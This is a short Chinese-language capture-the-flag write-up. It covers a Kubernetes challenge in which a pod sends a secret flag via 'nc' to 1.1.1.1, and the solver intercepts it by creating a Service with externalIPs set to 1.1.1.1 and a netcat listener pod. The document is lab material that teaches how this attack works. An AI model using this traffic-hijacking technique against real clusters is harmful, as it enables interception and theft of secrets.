# 37C3 Potluck CTF Hungry Helmsman writeup

主要是学习一下思路，通过自己创建一个pod和svc，svc设置`externalIPs`来使得另外一个pod访问`1.1.1.1`的时候通过我们设置的svc将flag发送到我们的pod里面。

题目环境：[potluckctf/challenges/challenge-10 at main · ZetaTwo/potluckctf](https://github.com/ZetaTwo/potluckctf/tree/main/challenges/challenge-10)

## Writeup

拥有`flag-reciever` namespace下面pod和service的create和delete权限，

`flag-sender`下有一个pod：

```bash
kubectl get pods flag-sender-676776d678-hcxh2 -o yaml -n flag-sender
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: "2024-01-14T12:43:51Z"
  generateName: flag-sender-676776d678-
  labels:
    app: flag-sender
    pod-template-hash: 676776d678
  name: flag-sender-676776d678-hcxh2
  namespace: flag-sender
  ownerReferences:
  - apiVersion: apps/v1
    blockOwnerDeletion: true
    controller: true
    kind: ReplicaSet
    name: flag-sender-676776d678
    uid: 90041816-902c-4488-987c-02d776abdfc3
  resourceVersion: "982"
  uid: 43aa558b-68d5-4d38-b9ad-edfe4da5319e
spec:
  containers:
  - args:
    - -c
    - while true; do echo $FLAG | nc 1.1.1.1 80 || continue; echo 'Flag Send'; sleep
      10; done
    command:
    - sh
    env:
    - name: FLAG
      valueFrom:
        secretKeyRef:
          key: flag
          name: flag
    image: busybox
    imagePullPolicy: IfNotPresent
    name: container
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-2lpgz
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  nodeName: k8s-ctf-worker3
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - name: kube-api-access-2lpgz
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2024-01-14T12:43:51Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2024-01-14T12:44:06Z"
    status: "True"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2024-01-14T12:44:06Z"
    status: "True"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2024-01-14T12:43:51Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: containerd://d775523d257c18942603877599220e6682059a4f912a24d0102f61c61bcb4b07
    image: docker.io/library/busybox:latest
    imageID: docker.io/library/busybox@sha256:ba76950ac9eaa407512c9d859cea48114eeff8a6f12ebaa5d32ce79d4a017dd8
    lastState: {}
    name: container
    ready: true
    restartCount: 0
    started: true
    state:
      running:
        startedAt: "2024-01-14T12:44:05Z"
  hostIP: 172.19.0.7
  phase: Running
  podIP: 10.244.3.2
  podIPs:
  - ip: 10.244.3.2
  qosClass: BestEffort
  startTime: "2024-01-14T12:43:51Z"
```

创建对应的pod和`externalIPs`为`1.1.1.1`的svc即可：

```yaml
apiVersion: v1          
kind: Service          
metadata:          
  name: my-custom-service          
  namespace: flag-reciever          
spec:          
  externalIPs:          
  - 1.1.1.1          
  ports:          
    - port: 80          
      targetPort: 8080          
  selector:          
    run: busyboxtest
---
apiVersion: v1          
kind: Pod          
metadata:          
  creationTimestamp: null          
  labels:          
    run: busyboxtest          
  name: busyboxtest          
  namespace: flag-reciever          
spec:          
  securityContext:          
    runAsNonRoot: true          
    runAsUser: 1000          
    seccompProfile:          
      type: RuntimeDefault          
  containers:          
  - image: busybox          
    name: busyboxtest          
    args: [/bin/sh, -c, 'nc -lp 8080']          
    ports:          
      - containerPort: 8080          
        name: http-web-svc          
    securityContext:          
        allowPrivilegeEscalation: false          
        capabilities:          
          drop:          
            - ALL          
    resources:          
        limits:          
          cpu: "100m"          
          memory: "0Mi"          
        requests:          
          cpu: "100m"          
          memory: "0Mi"          
  dnsPolicy: ClusterFirst          
  restartPolicy: Always          
status: {}


```



## References

[potluckctf/challenges/challenge-10 at main · ZetaTwo/potluckctf](https://github.com/ZetaTwo/potluckctf/tree/main/challenges/challenge-10)

[37C3 Potluck CTF Hungry Helmsman writeup](https://mp.weixin.qq.com/s/81MBJxulmuQri8NPXEH0UA)